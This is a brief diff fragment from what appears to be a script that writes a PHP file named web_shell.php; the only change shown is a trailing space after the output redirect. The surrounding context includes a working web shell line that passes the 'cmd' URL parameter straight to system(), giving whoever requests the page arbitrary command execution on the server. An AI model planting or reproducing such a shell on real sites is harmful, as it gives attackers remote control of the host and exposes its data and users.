@@ -23,4 +23,4 @@ if(isset($_GET["cmd"])) { system($_GET["cmd"]); }
 ?>
     </pre>
 </body>
-</html>' > web_shell.php
+</html>' > web_shell.php 
